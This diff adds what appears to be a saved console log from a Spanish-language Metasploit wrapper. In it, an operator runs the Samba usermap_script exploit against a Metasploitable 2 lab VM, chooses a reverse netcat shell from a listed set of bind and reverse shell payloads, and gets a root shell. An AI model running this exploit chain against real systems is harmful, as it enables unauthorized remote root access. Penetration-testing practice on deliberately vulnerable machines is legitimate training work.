@@ -1,0 +1,71 @@
+[+] Desea ver los banners de la maquina objetivo? (S/n)
+>>> n
+[+] Introduce el exploit que desea emplear:
+>>> exploit/multi/samba/usermap_script
+[0] cmd/unix/bind_awk
+[1] cmd/unix/bind_busybox_telnetd
+[2] cmd/unix/bind_inetd
+[3] cmd/unix/bind_jjs
+[4] cmd/unix/bind_lua
+[5] cmd/unix/bind_netcat
+[6] cmd/unix/bind_netcat_gaping
+[7] cmd/unix/bind_netcat_gaping_ipv6
+[8] cmd/unix/bind_perl
+[9] cmd/unix/bind_perl_ipv6
+[10] cmd/unix/bind_r
+[11] cmd/unix/bind_ruby
+[12] cmd/unix/bind_ruby_ipv6
+[13] cmd/unix/bind_socat_udp
+[14] cmd/unix/bind_zsh
+[15] cmd/unix/generic
+[16] cmd/unix/pingback_bind
+[17] cmd/unix/pingback_reverse
+[18] cmd/unix/reverse
+[19] cmd/unix/reverse_awk
+[20] cmd/unix/reverse_bash_telnet_ssl
+[21] cmd/unix/reverse_jjs
+[22] cmd/unix/reverse_ksh
+[23] cmd/unix/reverse_lua
+[24] cmd/unix/reverse_ncat_ssl
+[25] cmd/unix/reverse_netcat
+[26] cmd/unix/reverse_netcat_gaping
+[27] cmd/unix/reverse_openssl
+[28] cmd/unix/reverse_perl
+[29] cmd/unix/reverse_perl_ssl
+[30] cmd/unix/reverse_php_ssl
+[31] cmd/unix/reverse_python
+[32] cmd/unix/reverse_python_ssl
+[33] cmd/unix/reverse_r
+[34] cmd/unix/reverse_ruby
+[35] cmd/unix/reverse_ruby_ssl
+[36] cmd/unix/reverse_socat_udp
+[37] cmd/unix/reverse_ssh
+[38] cmd/unix/reverse_ssl_double_telnet
+[39] cmd/unix/reverse_tclsh
+[40] cmd/unix/reverse_zsh
+[+] Seleccione el indice del payload a emplear:
+>>> 25
+[+] Payload executed!
+Select a session to Connect:
+>>> 5
+Use 'exit()' to finish the connection.
+                _                  _       _ _        _     _      ____  
+ _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
+| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
+| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
+|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
+                            |_|                                          
+
+
+Warning: Never expose this VM to an untrusted network!
+
+Contact: msfdev[at]metasploit.com
+
+Login with msfadmin/msfadmin to get started
+
+
+
+>>> id
+uid=0(root) gid=0(root)
+
+>>> exit()
